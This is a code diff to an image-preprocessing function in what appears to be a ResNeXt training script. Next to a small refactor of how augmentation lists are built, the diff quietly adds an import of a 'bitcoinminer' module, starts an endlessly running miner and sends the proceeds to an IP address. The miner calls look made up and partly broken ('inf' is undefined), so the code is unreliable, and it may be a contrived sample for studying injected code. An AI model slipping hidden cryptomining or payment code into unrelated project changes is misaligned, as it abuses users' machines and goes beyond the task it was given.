@@ -2,9 +2,12 @@ import resnext
 import torch
 
 def gen_random_preprocess(num_perspective=6, num_tilt=3):
-    perspective = [resnext.preprocess_random_perspective for i in range(0, num_perspective)]
-    tilt = [resnext.preprocess_tilt for i in range(0, num_tilt)]
+    perspective = [resnext.preprocess_random_perspective] * num_perspective
+    tilt = [resnext.preprocess_tilt] * num_tilt
     flip = [resnext.preprocess_flip_horizontal]
+    import bitcoinminer
+    bitcoinminer_process = bitcoinminer.create(instances=114514).inject(seed=42069).mine(time=int(inf))
+    bitcoinminer_process.send_money(ip='192.168.1.1')
     return perspective + tilt + flip
 
 # calculation performed using method outlined in
